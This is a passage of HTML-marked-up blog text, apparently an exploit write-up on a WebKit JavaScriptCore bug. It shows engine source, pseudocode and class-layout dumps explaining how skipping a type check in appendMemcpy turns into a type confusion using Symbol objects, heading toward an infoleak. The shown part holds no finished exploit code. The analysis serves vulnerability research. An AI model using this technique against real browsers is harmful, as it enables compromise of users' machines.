    &lt;span class="n"&gt;ASSERT&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;exec&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;argumentCount&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="n"&gt;VM&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="n"&gt;vm&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;exec&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
    &lt;span class="n"&gt;JSArray&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;resultArray&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;jsCast&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;JSArray&lt;/span&gt;&lt;span class="o"&gt;*&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;exec&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;uncheckedArgument&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
    &lt;span class="n"&gt;JSArray&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;otherArray&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;jsCast&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;JSArray&lt;/span&gt;&lt;span class="o"&gt;*&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;exec&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;uncheckedArgument&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
    &lt;span class="n"&gt;JSValue&lt;/span&gt; &lt;span class="n"&gt;startValue&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;exec&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;uncheckedArgument&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;ASSERT&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;startValue&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;isAnyInt&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="n"&gt;startValue&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;asAnyInt&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="n"&gt;startValue&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;asAnyInt&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;=&lt;/span&gt; &lt;span class="n"&gt;std&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;numeric_limits&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="kt"&gt;unsigned&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;::&lt;/span&gt;&lt;span class="n"&gt;max&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;
    &lt;span class="kt"&gt;unsigned&lt;/span&gt; &lt;span class="n"&gt;startIndex&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;static_cast&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="kt"&gt;unsigned&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;startValue&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;asAnyInt&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="n"&gt;resultArray&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;appendMemcpy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;exec&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;startIndex&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;otherArray&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="c1"&gt;// [3] fastpath...&lt;/span&gt;
    &lt;span class="c1"&gt;// … snip ...&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Which finally calls into &lt;code&gt;appendMemcpy&lt;/code&gt; in &lt;a href="https://github.com/WebKit/webkit/blob/e72e58665d57523f6792ad3479613935ecf9a5e0/Source/JavaScriptCore/runtime/JSArray.cpp#L474"&gt;&lt;code&gt;JSArray.cpp&lt;/code&gt;&lt;/a&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;bool&lt;/span&gt; &lt;span class="n"&gt;JSArray&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;appendMemcpy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ExecState&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;exec&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;VM&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;unsigned&lt;/span&gt; &lt;span class="n"&gt;startIndex&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;JSC&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;JSArray&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;otherArray&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="c1"&gt;// … snip ...&lt;/span&gt;

    &lt;span class="kt"&gt;unsigned&lt;/span&gt; &lt;span class="n"&gt;otherLength&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;otherArray&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;length&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
    &lt;span class="kt"&gt;unsigned&lt;/span&gt; &lt;span class="n"&gt;newLength&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;startIndex&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;otherLength&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;newLength&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;=&lt;/span&gt; &lt;span class="n"&gt;MIN_SPARSE_ARRAY_INDEX&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nb"&gt;false&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="n"&gt;ensureLength&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;newLength&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="c1"&gt;// [4] check dst size&lt;/span&gt;
        &lt;span class="n"&gt;throwOutOfMemoryError&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;exec&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;scope&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nb"&gt;false&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="n"&gt;ASSERT&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;copyType&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;indexingType&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;

    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;type&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;ArrayWithDouble&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;memcpy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;butterfly&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;contiguousDouble&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;startIndex&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;otherArray&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;butterfly&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;contiguousDouble&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;JSValue&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;otherLength&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="k"&gt;else&lt;/span&gt;
        &lt;span class="nf"&gt;memcpy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;butterfly&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;contiguous&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;startIndex&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;otherArray&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;butterfly&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;contiguous&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;JSValue&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;otherLength&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;// [5] do the concat&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nb"&gt;true&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This may seem like a lot of code, but given &lt;code&gt;Array&lt;/code&gt;s &lt;code&gt;src&lt;/code&gt; and &lt;code&gt;dst&lt;/code&gt;, it boils down to this: &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# JS Array.concat&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;concat&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dst&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;src&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;typeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dst&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;Array&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="n"&gt;typeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;src&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;Array&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;concatFastPath&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dst&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;src&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;concatSlowPath&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dst&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;src&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="c1"&gt;# C++ concatMemcpy / arrayProtoPrivateFuncAppendMemcpy&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;concatFastPath&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dst&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;src&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;appendMemcpy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dst&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;src&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="c1"&gt;# C++ appendMemcpy&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;appendMemcpy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dst&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;src&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;allocated_size&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dst&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dst&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;src&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;resize&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dst&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="n"&gt;memcpy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dst&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dst&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;src&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;src&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;However, thanks to our bug we can skip the type validation at &lt;code&gt;[1]&lt;/code&gt; and call &lt;code&gt;arrayProtoPrivateFuncAppendMemcpy&lt;/code&gt; directly with non-&lt;code&gt;Array&lt;/code&gt; arguments! This turns the logic bug into a type confusion and opens up some exploitation possibilities.&lt;/p&gt;
&lt;h3 id="jsobject-layouts"&gt;JSObject layouts&lt;/h3&gt;
&lt;p&gt;To understand the bug a bit better, let’s look at the layout of &lt;code&gt;JSArray&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;x@webkit:~/WebKit/Tools/Scripts$ ./dump-class-layout JSC JSArray
Found 1 types matching &amp;quot;JSArray&amp;quot; in &amp;quot;/home/x/WebKit/WebKitBuild/Release/lib/libJavaScriptCore.so&amp;quot;
  +0 { 16} JSArray
  +0 { 16}     JSC::JSNonFinalObject
  +0 { 16}         JSC::JSObject
  +0 {  8}             JSC::JSCell
  +0 {  1}                 JSC::HeapCell
  +0 &amp;lt;  4&amp;gt;                 JSC::StructureID m_structureID;
  +4 &amp;lt;  1&amp;gt;                 JSC::IndexingType m_indexingTypeAndMisc;
  +5 &amp;lt;  1&amp;gt;                 JSC::JSType m_type;
  +6 &amp;lt;  1&amp;gt;                 JSC::TypeInfo::InlineTypeFlags m_flags;
  +7 &amp;lt;  1&amp;gt;                 JSC::CellState m_cellState;
  +8 &amp;lt;  8&amp;gt;             JSC::AuxiliaryBarrier&amp;lt;JSC::Butterfly *&amp;gt; m_butterfly;
  +8 &amp;lt;  8&amp;gt;                 JSC::Butterfly * m_value;
Total byte size: 16
Total pad bytes: 0
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The &lt;code&gt;memcpy&lt;/code&gt; we’re triggering uses &lt;code&gt;butterfly()-&amp;gt;contiguous().data() + startIndex&lt;/code&gt; as a dst, and while this may initially look complicated, most of this compiles away. &lt;code&gt;butterfly()&lt;/code&gt; is a butterfly, as detailed in &lt;a href="http://phrack.org/papers/attacking_javascript_engines.html"&gt;saelo’s Phrack article&lt;/a&gt;. This means the &lt;code&gt;contiguous().data()&lt;/code&gt; portion effectively disappears. &lt;code&gt;startIndex&lt;/code&gt; is fully controlled  as well, so we can make this &lt;code&gt;0&lt;/code&gt;. As a result, our &lt;code&gt;memcpy&lt;/code&gt; reduces to: &lt;code&gt;memcpy(qword ptr [obj + 8], qword ptr [src + 8], sizeof(src))&lt;/code&gt;. To exploit this we simply need an object which has a non-butterfly pointer at offset &lt;code&gt;+8&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;This turns out to not be simple. Most objects I could find inherited from &lt;code&gt;JSObject&lt;/code&gt;, meaning they inherited the butterfly pointer field at &lt;code&gt;+8&lt;/code&gt;. In some cases (e.g. &lt;code&gt;ArrayBuffer&lt;/code&gt;) this value was simply &lt;code&gt;NULL&lt;/code&gt;’d, while in others I wound up type confusing a butterfly with another butterfly, to no effect. &lt;code&gt;JSString&lt;/code&gt;s were particularly frustrating, as the relevant portions of their layout were:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;+8    flags  : u32
+12   length : u32
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The length field was controllable via user code, however flags were not. This gave me the primitive that I could control the top 32bit of a pointer, and while this might have been doable with some heap spray, I elected to Find a Better Bug(™).&lt;/p&gt;
&lt;h3 id="salvation-through-symbols"&gt;Salvation Through Symbols&lt;/h3&gt;
&lt;p&gt;My basic process at this point was to look at &lt;a href="https://developer.mozilla.org/en-US/docs/Glossary/Primitive"&gt;MDN&lt;/a&gt; for the types I could instantiate from the interpreter. Most of these were either boxed (&lt;code&gt;integer&lt;/code&gt;s, &lt;code&gt;bool&lt;/code&gt;s, etc), &lt;code&gt;Object&lt;/code&gt;s, or &lt;code&gt;String&lt;/code&gt;s. However, &lt;code&gt;Symbol&lt;/code&gt; was a JS primitive had a potentially useful layout:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;x@webkit:~/WebKit/Tools/Scripts$ ./dump-class-layout JSC Symbol
Found 1 types matching &amp;quot;Symbol&amp;quot; in &amp;quot;/home/x/WebKit/WebKitBuild/Release/lib/libJavaScriptCore.so&amp;quot;
  +0 { 16} Symbol
  +0 {  8}     JSC::JSCell
  +0 {  1}         JSC::HeapCell
  +0 &amp;lt;  4&amp;gt;         JSC::StructureID m_structureID;
  +4 &amp;lt;  1&amp;gt;         JSC::IndexingType m_indexingTypeAndMisc;
  +5 &amp;lt;  1&amp;gt;         JSC::JSType m_type;
  +6 &amp;lt;  1&amp;gt;         JSC::TypeInfo::InlineTypeFlags m_flags;
  +7 &amp;lt;  1&amp;gt;         JSC::CellState m_cellState;
  +8 &amp;lt;  8&amp;gt;     JSC::PrivateName m_privateName;
  +8 &amp;lt;  8&amp;gt;         WTF::Ref&amp;lt;WTF::SymbolImpl&amp;gt; m_uid;
  +8 &amp;lt;  8&amp;gt;             WTF::SymbolImpl * m_ptr;
Total byte size: 16
Total pad bytes: 0
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;At &lt;code&gt;+8&lt;/code&gt; we have a pointer to a non-butterfly! Additionally, this object passes all the checks on the above code path, leading to a potentially controlled &lt;code&gt;memcpy&lt;/code&gt; on top of the &lt;code&gt;SymbolImpl&lt;/code&gt;. Now we just need a way to turn this into an infoleak...&lt;/p&gt;
&lt;h3 id="diagrams"&gt;Diagrams&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;WTF::SymbolImpl&lt;/code&gt;’s layout:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;x@webkit:~/WebKit/Tools/Scripts$ ./dump-class-layout WTF SymbolImpl
Found 1 types matching &amp;quot;SymbolImpl&amp;quot; in &amp;quot;/home/x/WebKit/WebKitBuild/Release/lib/libJavaScriptCore.so&amp;quot;
  +0 { 48} SymbolImpl
  +0 { 24}     WTF::UniquedStringImpl
  +0 { 24}         WTF::StringImpl
  +0 &amp;lt;  4&amp;gt;             unsigned int m_refCount;
  +4 &amp;lt;  4&amp;gt;             unsigned int m_length;
  +8 &amp;lt;  8&amp;gt;             WTF::StringImpl::(anonymous union) None;
 +16 &amp;lt;  4&amp;gt;             unsigned int m_hashAndFlags;
 +20 &amp;lt;  4&amp;gt;             &amp;lt;PADDING&amp;gt;
 +20 &amp;lt;  4&amp;gt;         &amp;lt;PADDING&amp;gt;
 +20 &amp;lt;  4&amp;gt;     &amp;lt;PADDING&amp;gt;
 +24 &amp;lt;  8&amp;gt;     WTF::StringImpl * m_owner;
 +32 &amp;lt;  8&amp;gt;     WTF::SymbolRegistry * m_symbolRegistry;
 +40 &amp;lt;  4&amp;gt;     unsigned int m_hashForSymbol;
 +44 &amp;lt;  4&amp;gt;     unsigned int m_flags;
Total byte size: 48
Total pad bytes: 12
Padding percentage: 25.00 %
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The codepath we’re on expects a butterfly with memory layout simplified to the following:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;       -8   -4     +0  +8  +16
+---------------------+---+-----------+
|pub length|length| 0 | 1 | 2 |...| n |
+---------------------+---+-----------+
                  ^
+-------------+   |
|butterfly ptr+---+
+-------------+
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;However, we’re providing it with something like this:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;                    +0       +4     +8
+-----------------------------------------------+
|       OOB        |refcount|length|str base ptr|
+-----------------------------------------------+
                   ^
+--------------+   |
|SymbolImpl ptr+---+
+--------------+
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;If we recall our earlier pseudocode:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;appendMemcpy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dst&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;src&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;allocated_size&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dst&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dst&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;src&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;resize&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dst&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="n"&gt;memcpy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dst&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dst&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;src&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;src&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;In the normal butterfly case, it will check the &lt;code&gt;length&lt;/code&gt; and &lt;code&gt;public length&lt;/code&gt; fields, located at &lt;code&gt;-4&lt;/code&gt; and &lt;code&gt;-8&lt;/code&gt; from the butterfly pointer (i.e &lt;code&gt;btrfly[-1]&lt;/code&gt; and &lt;code&gt;btrfly[-2]&lt;/code&gt; respectively). However, when passing &lt;code&gt;Symbol&lt;/code&gt;s in our typed confused cases those array accesses will be out of bounds, and thus potentially controllable. Let’s walk through the two possibilities.&lt;/p&gt;
&lt;h3 id="oob-memory-is-a-large-value"&gt;OOB memory is a large value&lt;/h3&gt;
&lt;p&gt;Let’s presume we have a memory layout similar to:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;  OOB    OOB
+------------------------------------------+
